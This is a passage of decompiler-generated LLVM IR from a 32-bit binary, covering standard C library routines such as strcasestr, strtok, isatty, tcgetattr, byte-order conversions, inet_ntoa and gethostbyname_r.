  %v1_8052b12 = icmp eq i32 %v0_8052b17, 0
  br i1 %v1_8052b12, label %dec_label_pc_8052b2e, label %dec_label_pc_8052b16

dec_label_pc_8052b16:                             ; preds = %dec_label_pc_8052b12
  %v0_8052b18 = load i32, i32* @esi, align 4
  %v8_8052b19 = inttoptr i32 %arg2 to i8*
  store i8* %v8_8052b19, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_8052b1d = call i32 @memcpy(i16* %tmp45, i32 %v0_8052b18, i32 %v0_8052b17)
  %v1_8052b29 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052b29 = add i32 %arg2, -1
  %v3_8052b29 = add i32 %v2_8052b29, %v1_8052b29
  %v4_8052b29 = inttoptr i32 %v3_8052b29 to i8*
  store i8 0, i8* %v4_8052b29, align 1
  br label %dec_label_pc_8052b2e

dec_label_pc_8052b2e:                             ; preds = %dec_label_pc_8052b12, %dec_label_pc_8052b16
  %v0_8052b2e = load i32, i32* @ebp, align 4
  %v1_8052b2e = icmp eq i32 %v0_8052b2e, 0
  br i1 %v1_8052b2e, label %dec_label_pc_8052b39, label %dec_label_pc_8052b32

dec_label_pc_8052b32:                             ; preds = %dec_label_pc_8052b2e
  %v0_8052b32 = load i8*, i8** %stack_var_-108, align 4
  %v1_8052b32 = ptrtoint i8* %v0_8052b32 to i32
  %v2_8052b32 = call i32 @__errno_location(i32 %v1_8052b32)
  %v0_8052b37 = load i32, i32* @ebp, align 4
  %v2_8052b37 = inttoptr i32 %v2_8052b32 to i32*
  store i32 %v0_8052b37, i32* %v2_8052b37, align 4
  %v0_8052b3c.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8052b39

dec_label_pc_8052b39:                             ; preds = %dec_label_pc_8052b2e, %dec_label_pc_8052b32
  %v0_8052b3c = phi i32 [ 0, %dec_label_pc_8052b2e ], [ %v0_8052b3c.pre, %dec_label_pc_8052b32 ]
  ret i32 %v0_8052b3c

; uselistorder directives
  uselistorder i32 %v1_8052b07, { 1, 2, 0 }
  uselistorder i32 %v1_8052b04, { 1, 0, 2 }
  uselistorder i32 %v1_8052ad7, { 1, 0, 2 }
  uselistorder i32 %v1_8052aaf, { 0, 2, 1 }
  uselistorder i32 %v3_8052aac, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_805b680.500 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_8052b39, { 1, 0 }
  uselistorder label %dec_label_pc_8052b2e, { 1, 0 }
  uselistorder label %dec_label_pc_8052b12, { 1, 0 }
  uselistorder label %dec_label_pc_8052aea, { 1, 0 }
  uselistorder label %dec_label_pc_8052aa9, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_8052b54 = inttoptr i32 %arg2 to i8*
  %v3_8052b54 = call i32 @memmove(i8* %v2_8052b54, i32 %arg1)
  ret i32 %v3_8052b54
}

define i32 @strcasestr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8052b5f = load i32, i32* @ebx, align 4
  %v4_8052b63 = ptrtoint i8* %arg1 to i32
  %v1_8052b6f18 = inttoptr i32 %arg2 to i8*
  %v2_8052b6f1931 = load i8, i8* %v1_8052b6f18, align 1
  %v4_8052b712335 = icmp eq i8 %v2_8052b6f1931, 0
  %v1_8052b732436 = icmp eq i1 %v4_8052b712335, false
  br i1 %v1_8052b732436, label %dec_label_pc_8052b79.lr.ph.lr.ph, label %dec_label_pc_8052ba9

dec_label_pc_8052b79.lr.ph.lr.ph:                 ; preds = %entry
  %v3_8052b6f2032 = zext i8 %v2_8052b6f1931 to i32
  %v4_8052b6f.pre.pre = load i32, i32* @eax, align 4
  %v5_8052b6f2133 = and i32 %v4_8052b6f.pre.pre, -256
  %v6_8052b6f2234 = or i32 %v3_8052b6f2032, %v5_8052b6f2133
  %v4_8052b79.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052b79.lr.ph

dec_label_pc_8052b79.lr.ph:                       ; preds = %dec_label_pc_8052b79.lr.ph.lr.ph, %dec_label_pc_8052ba4
  %v4_8052b79.pre = phi i32 [ %v4_8052b79.pre.pre, %dec_label_pc_8052b79.lr.ph.lr.ph ], [ %v0_8052b86, %dec_label_pc_8052ba4 ]
  %v6_8052b6f2239 = phi i32 [ %v6_8052b6f2234, %dec_label_pc_8052b79.lr.ph.lr.ph ], [ %v6_8052b6f22, %dec_label_pc_8052ba4 ]
  %v2_8052b6f1938 = phi i8 [ %v2_8052b6f1931, %dec_label_pc_8052b79.lr.ph.lr.ph ], [ %v2_8052b6f19, %dec_label_pc_8052ba4 ]
  %v0_8052ba437 = phi i32 [ %v4_8052b63, %dec_label_pc_8052b79.lr.ph.lr.ph ], [ %v1_8052ba4, %dec_label_pc_8052ba4 ]
  br label %dec_label_pc_8052b79

dec_label_pc_8052b79:                             ; preds = %dec_label_pc_8052b79.lr.ph, %dec_label_pc_8052b99
  %v4_8052b79 = phi i32 [ %v4_8052b79.pre, %dec_label_pc_8052b79.lr.ph ], [ %v4_8052b7944, %dec_label_pc_8052b99 ]
  %v6_8052b6f29 = phi i32 [ %v6_8052b6f2239, %dec_label_pc_8052b79.lr.ph ], [ %v6_8052b6f, %dec_label_pc_8052b99 ]
  %v2_8052b6f28 = phi i8 [ %v2_8052b6f1938, %dec_label_pc_8052b79.lr.ph ], [ %v2_8052b6f, %dec_label_pc_8052b99 ]
  %v1_8052b6f27 = phi i8* [ %v1_8052b6f18, %dec_label_pc_8052b79.lr.ph ], [ %v1_8052b6f, %dec_label_pc_8052b99 ]
  %v0_8052b9926 = phi i32 [ %arg2, %dec_label_pc_8052b79.lr.ph ], [ %v1_8052b99, %dec_label_pc_8052b99 ]
  %v0_8052b9a25 = phi i32 [ %v0_8052ba437, %dec_label_pc_8052b79.lr.ph ], [ %v1_8052b9a, %dec_label_pc_8052b99 ]
  %v1_8052b79 = inttoptr i32 %v0_8052b9a25 to i8*
  %v2_8052b79 = load i8, i8* %v1_8052b79, align 1
  %v3_8052b79 = zext i8 %v2_8052b79 to i32
  %v5_8052b79 = and i32 %v4_8052b79, -256
  %v6_8052b79 = or i32 %v5_8052b79, %v3_8052b79
  %v15_8052b7f = icmp eq i8 %v2_8052b6f28, %v2_8052b79
  br i1 %v15_8052b7f, label %dec_label_pc_8052b99, label %dec_label_pc_8052b83

dec_label_pc_8052b83:                             ; preds = %dec_label_pc_8052b79
  %v2_8052b83 = load i8, i8* %v1_8052b79, align 1
  %v3_8052b83 = zext i8 %v2_8052b83 to i32
  %v0_8052b86 = load i32, i32* bitcast (i32** @global_var_805d440.503 to i32*), align 64
  %v2_8052b8c = load i8, i8* %v1_8052b6f27, align 1
  %v3_8052b8c = zext i8 %v2_8052b8c to i32
  %v2_8052b8f = mul nuw nsw i32 %v3_8052b83, 2
  %v3_8052b8f = add i32 %v2_8052b8f, %v0_8052b86
  %v4_8052b8f = inttoptr i32 %v3_8052b8f to i16*
  %v5_8052b8f = load i16, i16* %v4_8052b8f, align 2
  %v6_8052b8f = zext i16 %v5_8052b8f to i32
  %v4_8052b93 = mul nuw nsw i32 %v3_8052b8c, 2
  %v5_8052b93 = add i32 %v4_8052b93, %v0_8052b86
  %v6_8052b93 = inttoptr i32 %v5_8052b93 to i16*
  %v7_8052b93 = load i16, i16* %v6_8052b93, align 2
  %v18_8052b93 = icmp eq i16 %v5_8052b8f, %v7_8052b93
  %v1_8052b97 = icmp eq i1 %v18_8052b93, false
  br i1 %v1_8052b97, label %dec_label_pc_8052b9d, label %dec_label_pc_8052b99

dec_label_pc_8052b99:                             ; preds = %dec_label_pc_8052b83, %dec_label_pc_8052b79
  %v4_8052b7944 = phi i32 [ %v0_8052b86, %dec_label_pc_8052b83 ], [ %v6_8052b79, %dec_label_pc_8052b79 ]
  %v4_8052b6f6 = phi i32 [ %v6_8052b8f, %dec_label_pc_8052b83 ], [ %v6_8052b6f29, %dec_label_pc_8052b79 ]
  %v1_8052b99 = add i32 %v0_8052b9926, 1
  %v1_8052b9a = add i32 %v0_8052b9a25, 1
  %v1_8052b6f = inttoptr i32 %v1_8052b99 to i8*
  %v2_8052b6f = load i8, i8* %v1_8052b6f, align 1
  %v3_8052b6f = zext i8 %v2_8052b6f to i32
  %v5_8052b6f = and i32 %v4_8052b6f6, -256
  %v6_8052b6f = or i32 %v3_8052b6f, %v5_8052b6f
  %v4_8052b71 = icmp eq i8 %v2_8052b6f, 0
  %v1_8052b73 = icmp eq i1 %v4_8052b71, false
  br i1 %v1_8052b73, label %dec_label_pc_8052b79, label %dec_label_pc_8052ba9

dec_label_pc_8052b9d:                             ; preds = %dec_label_pc_8052b83
  %v4_8052b9d = icmp eq i8 %v2_8052b79, 0
  br i1 %v4_8052b9d, label %dec_label_pc_8052ba7, label %dec_label_pc_8052ba4

dec_label_pc_8052ba4:                             ; preds = %dec_label_pc_8052b9d
  %v1_8052ba4 = add i32 %v0_8052ba437, 1
  %v2_8052b6f19 = load i8, i8* %v1_8052b6f18, align 1
  %v3_8052b6f20 = zext i8 %v2_8052b6f19 to i32
  %v5_8052b6f21 = and i32 %v6_8052b8f, 65280
  %v6_8052b6f22 = or i32 %v3_8052b6f20, %v5_8052b6f21
  %v4_8052b7123 = icmp eq i8 %v2_8052b6f19, 0
  %v1_8052b7324 = icmp eq i1 %v4_8052b7123, false
  br i1 %v1_8052b7324, label %dec_label_pc_8052b79.lr.ph, label %dec_label_pc_8052ba9

dec_label_pc_8052ba7:                             ; preds = %dec_label_pc_8052b9d
  br label %dec_label_pc_8052ba9

dec_label_pc_8052ba9:                             ; preds = %dec_label_pc_8052ba4, %entry, %dec_label_pc_8052b99, %dec_label_pc_8052ba7
  %storemerge = phi i32 [ 0, %dec_label_pc_8052ba7 ], [ %v4_8052b63, %entry ], [ %v1_8052ba4, %dec_label_pc_8052ba4 ], [ %v0_8052ba437, %dec_label_pc_8052b99 ]
  store i32 %v0_8052b5f, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8052b6f19, { 1, 2, 0 }
  uselistorder i8 %v2_8052b6f, { 1, 2, 0 }
  uselistorder i8* %v1_8052b6f, { 1, 0 }
  uselistorder i32 %v0_8052b86, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8052b9a25, { 1, 0 }
  uselistorder i8 %v2_8052b6f1931, { 0, 2, 1 }
  uselistorder i8* %v1_8052b6f18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052ba9, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8052b79, { 1, 0 }
  uselistorder label %dec_label_pc_8052b79.lr.ph, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8052bc0 = inttoptr i32 %arg1 to i8*
  %v4_8052bc0 = call i32 @strtok_r(i8* %v3_8052bc0, i32 %arg2, i32 ptrtoint (i32* @global_var_80634c0.504 to i32))
  ret i32 %v4_8052bc0
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_8052bd8 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_8052bdd = icmp eq i32 %v3_8052bd8, 0
  %v1_8052bdf = zext i1 %v1_8052bdd to i32
  ret i32 %v1_8052bdf
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052bec = load i32, i32* @esi, align 4
  %v0_8052bed = load i32, i32* @ebx, align 4
  store i32 %v0_8052bed, i32* %stack_var_-8, align 4
  %v2_8052bf1 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8052bf1, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_8052c03 = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_8052bf1)
  store i32 %v3_8052c03, i32* %eax.global-to-local, align 4
  store i32 %v3_8052c03, i32* @esi, align 4
  %v1_8052c0d = icmp eq i32 %v3_8052c03, 0
  %v1_8052c0f = icmp eq i1 %v1_8052c0d, false
  br i1 %v1_8052c0f, label %dec_label_pc_8052c54, label %dec_label_pc_8052c11

dec_label_pc_8052c11:                             ; preds = %entry
  %v3_8052c11 = load i32, i32* %stack_var_-44, align 4
  %v1_8052c15 = load i32, i32* @ebx, align 4
  %v2_8052c15 = inttoptr i32 %v1_8052c15 to i32*
  store i32 %v3_8052c11, i32* %v2_8052c15, align 4
  %v1_8052c1b = load i32, i32* @ebx, align 4
  %v2_8052c1b = add i32 %v1_8052c1b, 4
  %v3_8052c1b = inttoptr i32 %v2_8052c1b to i32*
  %v1_8052c22 = load i32, i32* @ebx, align 4
  %v2_8052c22 = add i32 %v1_8052c22, 8
  %v3_8052c22 = inttoptr i32 %v2_8052c22 to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_8052c29 = load i32, i32* @ebx, align 4
  %v2_8052c29 = add i32 %v1_8052c29, 12
  %v3_8052c29 = inttoptr i32 %v2_8052c29 to i32*
  store i32 %tmp3, i32* %v3_8052c29, align 4
  %v4_8052c2c = zext i8 %tmp to i32
  %v5_8052c2c = load i32, i32* %eax.global-to-local, align 4
  %v6_8052c2c = and i32 %v5_8052c2c, -256
  %v7_8052c2c = or i32 %v6_8052c2c, %v4_8052c2c
  store i32 %v7_8052c2c, i32* %eax.global-to-local, align 4
  %v2_8052c30 = load i32, i32* @ebx, align 4
  %v3_8052c30 = add i32 %v2_8052c30, 16
  %v4_8052c30 = inttoptr i32 %v3_8052c30 to i8*
  store i8 %tmp, i8* %v4_8052c30, align 1
  %v0_8052c33 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052c36 = ptrtoint i32* %stack_var_-27 to i32
  %v0_8052c3b = load i32, i32* @ebx, align 4
  %v1_8052c3b = add i32 %v0_8052c3b, 17
  store i32 %v1_8052c3b, i32* %eax.global-to-local, align 4
  %v4_8052c3f = call i32 @__GI_mempcpy(i32 %v1_8052c3b, i32 %v2_8052c36, i32 19, i32 %v0_8052c33)
  store i32 %v4_8052c3f, i32* %eax.global-to-local, align 4
  %v3_8052c4c = inttoptr i32 %v4_8052c3f to i8*
  %v4_8052c4c = call i32 @__GI_memset(i8* %v3_8052c4c, i32 0, i32 13)
  store i32 %v4_8052c4c, i32* %eax.global-to-local, align 4
  %v0_8052c54.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052c54

dec_label_pc_8052c54:                             ; preds = %entry, %dec_label_pc_8052c11
  %v0_8052c54 = phi i32 [ %v3_8052c03, %entry ], [ %v0_8052c54.pre, %dec_label_pc_8052c11 ]
  store i32 %v0_8052c54, i32* %eax.global-to-local, align 4
  %v2_8052c59 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052c59, i32* @ebx, align 4
  store i32 %v0_8052bec, i32* @esi, align 4
  ret i32 %v0_8052c54

; uselistorder directives
  uselistorder i32 %v0_8052c54, { 1, 0 }
  uselistorder i32 %v3_8052c03, { 0, 2, 1, 3 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052c54, { 1, 0 }
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8052c60 = trunc i32 %arg1 to i16
  %v2_8052c60 = call i16 @llvm.bswap.i16(i16 %v1_8052c60)
  %v3_8052c60 = zext i16 %v2_8052c60 to i32
  ret i32 %v3_8052c60
}

define i32 @htonl() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v1_8052c6c = call i32 @llvm.bswap.i32(i32 %tmp)
  ret i32 %v1_8052c6c
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8052c73 = trunc i32 %arg1 to i16
  %v2_8052c73 = call i16 @llvm.bswap.i16(i16 %v1_8052c73)
  %v3_8052c73 = zext i16 %v2_8052c73 to i32
  ret i32 %v3_8052c73
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8052c7f = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_8052c7f
}

define i32 @hstrerror(i32 %arg1) local_unnamed_addr {
entry:
  %v6_8052c90 = icmp ugt i32 %arg1, 4
  br i1 %v6_8052c90, label %dec_label_pc_8052c99, label %dec_label_pc_8052c92

dec_label_pc_8052c92:                             ; preds = %entry
  %v1_8052c92 = mul i32 %arg1, 4
  %v2_8052c92 = add i32 %v1_8052c92, ptrtoint ([5 x i8*]* @global_var_805c248.511 to i32)
  %v3_8052c92 = inttoptr i32 %v2_8052c92 to i32*
  %v4_8052c92 = load i32, i32* %v3_8052c92, align 4
  br label %dec_label_pc_8052c99

dec_label_pc_8052c99:                             ; preds = %entry, %dec_label_pc_8052c92
  %v0_8052c99 = phi i32 [ ptrtoint ([15 x i8]* @global_var_805c25c.505 to i32), %entry ], [ %v4_8052c92, %dec_label_pc_8052c92 ]
  ret i32 %v0_8052c99

; uselistorder directives
  uselistorder label %dec_label_pc_8052c99, { 1, 0 }
}

define i32 @__GI_herror(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8052c9f = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052c9f, i32* @ebx, align 4
  %v2_8052ca3 = icmp eq i8* %arg1, null
  br i1 %v2_8052ca3, label %dec_label_pc_8052cb1, label %dec_label_pc_8052ca7

dec_label_pc_8052ca7:                             ; preds = %entry
  store i32 ptrtoint ([3 x i8]* @global_var_805c26b.512 to i32), i32* @esi, align 4
  %v3_8052cac = load i8, i8* %arg1, align 1
  %v4_8052cac = icmp eq i8 %v3_8052cac, 0
  %v1_8052caf = icmp eq i1 %v4_8052cac, false
  br i1 %v1_8052caf, label %dec_label_pc_8052cb6, label %dec_label_pc_8052cb1

dec_label_pc_8052cb1:                             ; preds = %dec_label_pc_8052ca7, %entry
  store i32 ptrtoint (i32* @global_var_805c26d.513 to i32), i32* @esi, align 4
  br label %dec_label_pc_8052cb6

dec_label_pc_8052cb6:                             ; preds = %dec_label_pc_8052ca7, %dec_label_pc_8052cb1
  %v0_8052cb6 = call i32 @__GI___h_errno_location()
  store i32 ptrtoint ([15 x i8]* @global_var_805c25c.505 to i32), i32* @edx, align 4
  %v1_8052cc0 = inttoptr i32 %v0_8052cb6 to i32*
  %v2_8052cc0 = load i32, i32* %v1_8052cc0, align 4
  %v6_8052cc5 = icmp ugt i32 %v2_8052cc0, 4
  br i1 %v6_8052cc5, label %dec_label_pc_8052cce, label %dec_label_pc_8052cc7

dec_label_pc_8052cc7:                             ; preds = %dec_label_pc_8052cb6
  %v1_8052cc7 = mul i32 %v2_8052cc0, 4
  %v2_8052cc7 = add i32 %v1_8052cc7, ptrtoint ([5 x i8*]* @global_var_805c248.511 to i32)
  %v3_8052cc7 = inttoptr i32 %v2_8052cc7 to i32*
  %v4_8052cc7 = load i32, i32* %v3_8052cc7, align 4
  store i32 %v4_8052cc7, i32* @edx, align 4
  br label %dec_label_pc_8052cce

dec_label_pc_8052cce:                             ; preds = %dec_label_pc_8052cb6, %dec_label_pc_8052cc7
  %v0_8052cd1 = phi i32 [ ptrtoint ([15 x i8]* @global_var_805c25c.505 to i32), %dec_label_pc_8052cb6 ], [ %v4_8052cc7, %dec_label_pc_8052cc7 ]
  %v0_8052cd2 = load i32, i32* @esi, align 4
  %v0_8052cd9 = load i32, i32* inttoptr (i32 134599164 to i32*), align 4
  %v9_8052cdf = call i32 @fprintf(i32 %v0_8052cd9, i32 ptrtoint ([8 x i8]* @global_var_805c1da.514 to i32), i32 %v4_8052c9f, i32 %v0_8052cd2, i32 %v0_8052cd1)
  ret i32 %v9_8052cdf

; uselistorder directives
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_805c25c.505 to i32), { 0, 2, 1 }
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052cce, { 1, 0 }
  uselistorder label %dec_label_pc_8052cb6, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8052cec = load i32, i32* @edi, align 4
  %v0_8052ced = load i32, i32* @esi, align 4
  %v0_8052cee = load i32, i32* @ebx, align 4
  store i32 %v0_8052cee, i32* %stack_var_-12, align 4
  store i32 0, i32* @edi, align 4
  %v1_8052cf9 = add i32 %arg2, 15
  store i32 %v1_8052cf9, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @esi, align 4
  %v1_8052cfe = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_8052cfe, 16777216
  %v1_8052d00 = sdiv i32 %sext, 16777216
  store i32 %v1_8052d00, i32* @ebx, align 4
  br label %dec_label_pc_8052d04

dec_label_pc_8052d04:                             ; preds = %entry, %dec_label_pc_8052d29
  %v0_8052d0717 = phi i32 [ %v1_8052d00, %entry ], [ %v2_8052d29, %dec_label_pc_8052d29 ]
  %v0_8052d3416 = phi i32 [ %v1_8052cf9, %entry ], [ %v0_8052d2d, %dec_label_pc_8052d29 ]
  %v1_8052d09 = urem i32 %v0_8052d0717, 256
  %v5_8052d17 = inttoptr i32 %v0_8052d3416 to i8*
  %v6_8052d17 = call i32 @_uintmaxtostr(i8* %v5_8052d17, i32 %v1_8052d09, i32 0, i32 -10, i32 0)
  %v0_8052d1f = load i32, i32* @esi, align 4
  %v1_8052d1f = icmp eq i32 %v0_8052d1f, 0
  %v1_8052d21 = add i32 %v6_8052d17, -1
  store i32 %v1_8052d21, i32* %ecx.global-to-local, align 4
  br i1 %v1_8052d1f, label %dec_label_pc_8052d29, label %dec_label_pc_8052d26

dec_label_pc_8052d26:                             ; preds = %dec_label_pc_8052d04
  %v1_8052d26 = inttoptr i32 %v0_8052d1f to i8*
  store i8 46, i8* %v1_8052d26, align 1
  %v0_8052d2d.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052d29

dec_label_pc_8052d29:                             ; preds = %dec_label_pc_8052d04, %dec_label_pc_8052d26
  %v0_8052d2d = phi i32 [ %v1_8052d21, %dec_label_pc_8052d04 ], [ %v0_8052d2d.pre, %dec_label_pc_8052d26 ]
  %v0_8052d29 = load i32, i32* @ebx, align 4
  %v2_8052d29 = udiv i32 %v0_8052d29, 256
  store i32 %v2_8052d29, i32* @ebx, align 4
  %v0_8052d2c = load i32, i32* @edi, align 4
  %v1_8052d2c = add i32 %v0_8052d2c, 1
  store i32 %v1_8052d2c, i32* @edi, align 4
  store i32 %v0_8052d2d, i32* @esi, align 4
  %v7_8052d32 = icmp sgt i32 %v1_8052d2c, 3
  br i1 %v7_8052d32, label %dec_label_pc_8052d34, label %dec_label_pc_8052d04

dec_label_pc_8052d34:                             ; preds = %dec_label_pc_8052d29
  %v1_8052d34 = add i32 %v0_8052d2d, 1
  %v2_8052d37 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052d37, i32* @ebx, align 4
  store i32 %v0_8052ced, i32* @esi, align 4
  store i32 %v0_8052cec, i32* @edi, align 4
  ret i32 %v1_8052d34

; uselistorder directives
  uselistorder i32 %v0_8052d2d, { 0, 2, 1 }
  uselistorder i32 %v1_8052d00, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052d29, { 1, 0 }
  uselistorder label %dec_label_pc_8052d04, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %v2_8052d47 = call i32 @__GI_inet_ntoa_r(i32 %arg1, i32 ptrtoint (i32* @global_var_80634c4.515 to i32))
  ret i32 %v2_8052d47
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_8052d53 = ptrtoint i32* %stack_var_-4 to i32
  %v2_8052d5c = inttoptr i32 %arg1 to i8*
  %v3_8052d5c = call i32 @inet_aton(i8* %v2_8052d5c, i32 %v2_8052d53)
  %v1_8052d67 = icmp eq i32 %v3_8052d5c, 0
  br i1 %v1_8052d67, label %dec_label_pc_8052d6f, label %dec_label_pc_8052d6b

dec_label_pc_8052d6b:                             ; preds = %entry
  %v3_8052d6b = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052d6f

dec_label_pc_8052d6f:                             ; preds = %entry, %dec_label_pc_8052d6b
  %v0_8052d6f = phi i32 [ -1, %entry ], [ %v3_8052d6b, %dec_label_pc_8052d6b ]
  ret i32 %v0_8052d6f

; uselistorder directives
  uselistorder label %dec_label_pc_8052d6f, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8052d7b = call i32 @__GI___h_errno_location()
  %v0_8052d80 = load i32, i32* @edx, align 4
  %v2_8052d83 = ptrtoint i32* %stack_var_-4 to i32
  %v9_8052d9b = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_80636ac.517, i32 ptrtoint (i32* @global_var_80634e0.516 to i32), i32 460, i32 %v2_8052d83, i32 %v0_8052d7b, i32 %v0_8052d80, i32 %v0_8052d80)
  %v3_8052da0 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_8052da0
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i64 @__decompiler_undefined_function_1()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_8052da8 = load i32, i32* @ebp, align 4
  %v0_8052da9 = load i32, i32* @edi, align 4
  %v0_8052daa = load i32, i32* @esi, align 4
  %v0_8052dab = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_8052dbb = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_8052dbb, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_8052dc6 = icmp eq i32 %arg1, 0
  br i1 %v4_8052dc6, label %dec_label_pc_80530d2, label %dec_label_pc_8052dd1

dec_label_pc_8052dd1:                             ; preds = %entry
  %v1_8052dd1 = call i32 @__errno_location(i32 %v0_8052dab)
  store i32 %v1_8052dd1, i32* %eax.global-to-local, align 4
  store i32 %v1_8052dd1, i32* @esi, align 4
  %v1_8052dd8 = inttoptr i32 %v1_8052dd1 to i32*
  %v2_8052dd8 = load i32, i32* %v1_8052dd8, align 4
  store i32 %v2_8052dd8, i32* @edi, align 4
  store i32 0, i32* %v1_8052dd8, align 4
  %v0_8052de9 = load i32, i32* @ebx, align 4
  store i32 %v0_8052de9, i32* %stack_var_-108, align 4
  %v7_8052df5 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_8052de9, i32 %arg5, i32 %arg6, i32 %v1_8052dd1)
  store i32 %v7_8052df5, i32* %eax.global-to-local, align 4
  %v1_8052dfd = icmp eq i32 %v7_8052df5, 0
  br i1 %v1_8052dfd, label %dec_label_pc_80530d2, label %dec_label_pc_8052e05

dec_label_pc_8052e05:                             ; preds = %dec_label_pc_8052dd1
  store i32 %arg6, i32* @ecx, align 4
  %v1_8052e09 = inttoptr i32 %arg6 to i32*
  %v2_8052e09 = load i32, i32* %v1_8052e09, align 4
  store i32 %v2_8052e09, i32* %edx.global-to-local, align 4
  %v9_8052e0b = icmp eq i32 %v2_8052e09, 1
  br i1 %v9_8052e0b, label %dec_label_pc_8052e25, label %dec_label_pc_8052e10

dec_label_pc_8052e10:                             ; preds = %dec_label_pc_8052e05
  %v9_8052e10 = icmp eq i32 %v2_8052e09, 4
  br i1 %v9_8052e10, label %dec_label_pc_8052e25, label %dec_label_pc_8052e15

dec_label_pc_8052e15:                             ; preds = %dec_label_pc_8052e10
  %v1_8052e15 = add i32 %v2_8052e09, 1
  %v8_8052e15 = icmp eq i32 %v1_8052e15, 0
  store i32 %v1_8052e15, i32* %edx.global-to-local, align 4
  %v1_8052e16 = icmp eq i1 %v8_8052e15, false
  br i1 %v1_8052e16, label %dec_label_pc_80530d2, label %dec_label_pc_8052e1c

dec_label_pc_8052e1c:                             ; preds = %dec_label_pc_8052e15
  %v0_8052e1c = load i32, i32* @esi, align 4
  %v1_8052e1c = inttoptr i32 %v0_8052e1c to i32*
  %v2_8052e1c = load i32, i32* %v1_8052e1c, align 4
  %v11_8052e1c = icmp eq i32 %v2_8052e1c, 2
  %v1_8052e1f = icmp eq i1 %v11_8052e1c, false
